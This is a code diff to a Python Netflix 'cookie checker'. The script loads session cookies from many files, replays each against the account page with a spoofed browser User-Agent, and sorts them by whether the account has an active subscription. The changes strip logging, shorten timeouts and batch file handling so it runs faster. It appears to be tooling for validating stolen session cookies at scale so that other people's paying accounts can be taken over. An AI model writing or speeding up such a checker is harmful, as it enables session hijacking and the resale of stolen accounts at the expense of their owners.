@@ -258,63 +258,51 @@ def load_cookies_from_file(cookie_file):
 
 def make_request_with_cookies(cookies):
     """Make an HTTP request to Netflix using provided cookies."""
-    session = requests.Session()
-    
-    # Sanitize cookie values to prevent encoding issues
-    safe_cookies = {}
-    for key, value in cookies.items():
-        try:
-            # Convert value to string and sanitize
-            if value is not None:
-                # More aggressive sanitization:
-                # 1. Strip any surrounding quotes or spaces
-                # 2. Remove any non-ASCII characters
-                # 3. Ensure the value is URL-encodable
-                if isinstance(value, str):
-                    value = value.strip().strip('"\'')
-                safe_value = str(value).encode('ascii', 'ignore').decode('ascii')
-                
-                # Additional check to handle any problematic characters
-                # This ensures only valid URL-safe characters are kept
-                safe_value = re.sub(r'[^\x00-\x7F]+', '', safe_value)
-                safe_cookies[key] = safe_value
-        except Exception as e:
-            debug_print(f"Error sanitizing cookie {key}: {str(e)}")
-            # Skip problematic cookies
-            continue
-    
-    # If important Netflix cookies are missing, don't even try the request
+    # Quick check for required cookies before creating session to save time
     required_cookies = ['NetflixId', 'SecureNetflixId']
-    if not any(cookie in safe_cookies for cookie in required_cookies):
-        debug_print("Missing essential Netflix cookies, skipping request")
+    if not any(cookie in cookies for cookie in required_cookies):
+        # Skip debug print for speed
         return ""
     
-    # Update session with sanitized cookies
-    session.cookies.update(safe_cookies)
+    # Fast path sanitization - only process important cookies
+    important_cookies = ['NetflixId', 'SecureNetflixId', 'nfvdid', 'memclid', 'cL', 'OptanonConsent']
+    safe_cookies = {}
+    for key, value in cookies.items():
+        # Use minimal processing for non-critical cookies
+        if key not in important_cookies and 'netflix' not in key.lower():
+            continue
+            
+        try:
+            if value is not None:
+                # Fast path sanitization
+                if isinstance(value, str):
+                    value = value.strip()
+                    if value.startswith('"') and value.endswith('"'):
+                        value = value[1:-1]
+                safe_cookies[key] = str(value)
+        except:
+            # Skip problematic cookies silently for speed
+            continue
     
-    # Use minimal headers to avoid encoding issues
+    # Use requests directly instead of session to reduce overhead
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'identity'  # Avoid compression to speed up requests
     }
     
     try:
-        # Use optimized timeout values for faster checking
-        response = session.get(
+        # Use even faster timeout values
+        response = requests.get(
             "https://www.netflix.com/YourAccount", 
-            headers=headers, 
-            timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT)
+            headers=headers,
+            cookies=safe_cookies,
+            timeout=(1.5, 2.5)  # Faster timeouts (connection, read)
         )
         return response.text
-    except requests.exceptions.RequestException as e:
-        debug_print(f"Request error: {str(e)}")
-        return ""
-    except UnicodeError as e:
-        debug_print(f"Unicode encoding error: {str(e)}")
-        return ""
-    except Exception as e:
-        debug_print(f"Unexpected error during request: {str(e)}")
+    except:
+        # Skip error logging for speed
         return ""
 
 def extract_info(response_text):
@@ -443,10 +431,7 @@ def handle_failed_login(cookie_file):
 
 def process_cookie_file(cookie_file):
     """Process a single Netflix cookie file to check validity."""
-    global total_checked, total_broken
-    with lock:
-        total_checked += 1
-    
+    # Don't increment global counter here - do it in batches in the worker
     result = {
         "valid": False,
         "details": None,
@@ -454,45 +439,49 @@ def process_cookie_file(cookie_file):
     }
     
     try:
-        debug_print(f"Processing {cookie_file}")
+        # Skip debug print for speed
         cookies = load_cookies_from_file(cookie_file)
         
         if not cookies:
-            debug_print(f"No valid cookies found in {cookie_file}")
-            broken_folder = dirs["netflix"]["broken"]
-            if os.path.exists(cookie_file):
-                shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
-            with lock:
-                total_broken += 1
+            # Don't move files immediately for speed - batch operations later
+            # Just return the result without extra operations
+            result["status"] = "Broken"
             return result
         
+        # Fast path cookie checking
         response_text = make_request_with_cookies(cookies)
         
         if not response_text:
-            debug_print(f"Empty response for {cookie_file}")
-            handle_failed_login(cookie_file)
+            # Don't handle file ops inline - collect results and handle in batches
+            result["status"] = "Failed"
             return result
         
-        info = extract_info(response_text)
-        is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
-        
-        if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
-            details = handle_successful_login(cookie_file, info, is_subscribed)
-            if is_subscribed:
-                result["valid"] = True
-                result["details"] = details
-            return result
-        else:
-            handle_failed_login(cookie_file)
+        # Try to extract info quickly
+        try:
+            info = extract_info(response_text)
+            is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
+            
+            if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
+                # Store info for batch processing later
+                result["info"] = info
+                result["is_subscribed"] = is_subscribed
+                result["status"] = "Working" if is_subscribed else "Unsubscribed"
+                result["cookie_file"] = cookie_file
+                
+                if is_subscribed:
+                    result["valid"] = True
+                    # Don't create details yet - defer to reduce processing time
+                return result
+            else:
+                result["status"] = "Failed"
+                return result
+        except Exception as e:
+            # Fast path error handling - just mark as failed
+            result["status"] = "Failed"
             return result
     except Exception as e:
-        debug_print(f"Error processing {cookie_file}: {str(e)}")
-        debug_print(traceback.format_exc())
-        broken_folder = dirs["netflix"]["broken"]
-        if os.path.exists(cookie_file):
-            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
-        with lock:
-            total_broken += 1
+        # Skip debug print and stacktrace for speed
+        result["status"] = "Broken"
         return result
 
 def worker(task_queue, results):
